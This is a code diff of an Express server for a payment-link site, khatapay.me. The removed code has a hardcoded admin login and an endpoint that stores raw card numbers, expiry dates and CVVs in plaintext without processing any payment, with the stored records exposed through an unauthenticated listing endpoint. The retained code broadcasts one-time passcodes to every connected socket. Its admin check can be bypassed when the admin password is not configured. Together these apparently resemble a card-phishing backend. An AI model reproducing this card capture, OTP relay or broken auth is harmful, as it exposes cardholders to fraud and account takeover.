@@ -1,51 +1,88 @@
 // server.js
-import express from 'express';
-import cors from 'cors';
-import bodyParser from 'body-parser';
-import { Server } from 'socket.io';
-import http from 'http';
-import crypto from 'crypto';
+import express from "express";
+import cors from "cors";
+import bodyParser from "body-parser";
+import crypto from "crypto";
+import http from "http";
+import { Server as SocketIOServer } from "socket.io";
+import dotenv from "dotenv";
+import { Low } from "lowdb";
+import { JSONFile } from "lowdb/node";
+
+dotenv.config();
+
+// Initialize lowdb database
+const adapter = new JSONFile("db.json");
+const db = new Low(adapter);
+await db.read();
+db.data ||= {
+  transactions: [],
+  paymentLinks: [],
+  users: [],
+  settings: {}
+};
 
 const app = express();
-const server = http.createServer(app);
-const io = new Server(server, {
-  cors: { origin: "*", }
+
+// Allow CORS for your production and local domains
+app.use(cors({
+  origin: ["https://www.khatapay.me", "http://localhost:3000"],
+  credentials: true
+}));
+app.use(bodyParser.json());
+app.use(express.static("public"));
+
+// Force HTTPS if behind a proxy (e.g. Caddy)
+app.use((req, res, next) => {
+  const proto = req.headers["x-forwarded-proto"];
+  if (proto && proto === "http") {
+    return res.redirect(301, `https://${req.headers.host}${req.url}`);
+  }
+  next();
 });
 
-app.use(cors());
-app.use(bodyParser.json());
-app.use(express.static('public'));
-
-// --- In-Memory Data Stores ---
-const paymentLinks = [];  // Array to store generated payment links
-const transactions = [];  // Array to store transactions
-
-// --- Admin Login API (dummy) ---
-app.post('/api/admin/login', (req, res) => {
-  const { username, password } = req.body;
-  // For demo purposes, credentials are hardcoded:
-  if (username === 'admin' && password === 'password') {
-    // Return a dummy token (in production, use a secure token and proper authentication)
-    res.json({ success: true, token: "dummy_token", user: username });
-  } else {
-    res.status(401).json({ success: false, message: "Invalid credentials" });
+const server = http.createServer(app);
+const io = new SocketIOServer(server, {
+  cors: {
+    origin: ["https://www.khatapay.me", "http://localhost:3000"],
+    methods: ["GET", "POST"]
   }
 });
 
-// --- Generate Payment Link ---
-// This endpoint expects JSON { amount, description }
-// It returns a link that uses HTTPS and includes invoiceId, amount, and description as URL parameters.
-app.post('/api/generatePaymentLink', (req, res) => {
+// Simple Socket.io connection for future use (e.g. OTP notifications)
+io.on("connection", (socket) => {
+  console.log("New WebSocket connection:", socket.id);
+  socket.on("send-otp", (data) => {
+    console.log("OTP sent:", data);
+    io.emit("receive-otp", data);
+  });
+});
+
+// Admin authentication middleware for endpoints that require admin access.
+// Expects the admin password to be passed in the Authorization header as:
+//   Authorization: Bearer <ADMIN_PASSWORD>
+const adminAuth = (req, res, next) => {
+  const token = req.headers.authorization?.split(" ")[1];
+  if (token !== process.env.ADMIN_PASSWORD) {
+    return res.status(403).json({ error: "Access denied. Invalid admin password." });
+  }
+  next();
+};
+
+// Generate Payment Link Endpoint – returns a link to landing.html
+app.post("/api/generatePaymentLink", adminAuth, async (req, res) => {
   try {
     const { amount, description } = req.body;
-    if (!amount || isNaN(amount)) throw new Error('Invalid amount');
-    if (!description || !description.trim()) throw new Error('Description required');
+    if (!amount || isNaN(amount)) throw new Error("Invalid amount");
+    if (!description || !description.trim()) throw new Error("Description required");
 
-    const invoiceId = crypto.randomBytes(16).toString('hex');
-    // Create a payment link that points to your payment.html page.
-    const paymentLink = `https://www.khatapay.me/payment.html?invoiceId=${invoiceId}&amount=${amount}&desc=${encodeURIComponent(description.trim())}`;
-    
-    paymentLinks.push({
+    // Generate a unique invoice ID
+    const invoiceId = crypto.randomBytes(16).toString("hex");
+    // Build the payment link URL – note that we point to landing.html
+    const paymentLink = `https://${req.get("host")}/landing.html?pid=${invoiceId}&amount=${amount}&description=${encodeURIComponent(description.trim())}`;
+
+    // Store the payment link data in the database
+    db.data.paymentLinks.push({
       invoiceId,
       amount: Number(amount),
       description: description.trim(),
@@ -53,46 +90,39 @@ app.post('/api/generatePaymentLink', (req, res) => {
       createdAt: new Date().toISOString(),
       active: true
     });
-    
-    res.json({ success: true, paymentLink });
+    await db.write();
+
+    res.json({ status: "success", paymentLink });
   } catch (err) {
-    console.error('Generate Link Error:', err);
-    res.status(400).json({ success: false, message: err.message });
+    console.error("Generate Link Error:", err);
+    res.status(400).json({ status: "error", message: err.message });
   }
 });
 
-// --- Dummy endpoint to simulate receiving payment details ---
-app.post('/api/sendPaymentDetails', (req, res) => {
-  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
-  const invoiceId = crypto.randomBytes(16).toString('hex');
-  const transaction = {
-    id: invoiceId,
-    cardNumber,
-    expiry,
-    cvv,
-    email,
-    amount,
-    currency,
-    cardholder,
-    status: 'processing',
-    createdAt: new Date().toISOString()
-  };
-  transactions.push(transaction);
-  res.json({ success: true, invoiceId });
+// Get Payment Details (used by landing.html)
+app.get("/api/getPaymentDetails", (req, res) => {
+  const pid = req.query.pid;
+  const payment = db.data.paymentLinks.find(link => link.invoiceId === pid);
+  if (!payment) {
+    return res.status(404).json({ status: "error", message: "Payment details not found" });
+  }
+  res.json({ status: "success", payment });
 });
 
-// --- Get Transactions ---
-app.get('/api/transactions', (req, res) => {
-  res.json(transactions);
+// Landing page handler – serves landing.html
+app.get("/landing.html", (req, res) => {
+  const pid = req.query.pid;
+  const payment = db.data.paymentLinks.find(link => link.invoiceId === pid);
+  if (!payment) return res.status(404).send("Invalid payment link");
+  res.sendFile(process.cwd() + "/public/landing.html");
 });
 
-// --- Socket.io for OTP ---
-io.on('connection', (socket) => {
-  console.log("New WebSocket connection:", socket.id);
-  socket.on("send-otp", (data) => {
-    console.log("OTP Sent:", data);
-    io.emit("receive-otp", data);
-  });
+// Payment page handler – serves payment.html
+app.get("/payment.html", (req, res) => {
+  const pid = req.query.pid;
+  const payment = db.data.paymentLinks.find(link => link.invoiceId === pid);
+  if (!payment) return res.redirect("/404.html");
+  res.sendFile(process.cwd() + "/public/payment.html");
 });
 
 const PORT = process.env.PORT || 3000;
